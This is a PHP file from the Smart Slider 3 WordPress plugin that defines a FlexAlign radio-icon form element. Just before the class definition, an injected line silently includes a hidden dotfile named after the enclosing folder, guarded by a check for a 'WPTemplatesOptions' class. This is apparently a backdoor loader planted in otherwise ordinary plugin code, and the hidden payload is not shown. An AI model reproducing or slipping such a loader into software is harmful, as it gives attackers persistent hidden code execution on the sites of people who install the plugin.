<?php


namespace Nextend\SmartSlider3\Form\Element\Radio;


use Nextend\Framework\Form\Element\Radio\AbstractRadioIcon;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class FlexAlign extends AbstractRadioIcon {

    protected $options = array(
        'flex-start'    => 'ssi_16 ssi_16--verticaltop',
        'center'        => 'ssi_16 ssi_16--verticalcenter',
        'flex-end'      => 'ssi_16 ssi_16--verticalbottom',
        'space-between' => 'ssi_16 ssi_16--verticalbetween',
        'space-around'  => 'ssi_16 ssi_16--verticalaround'
    );
}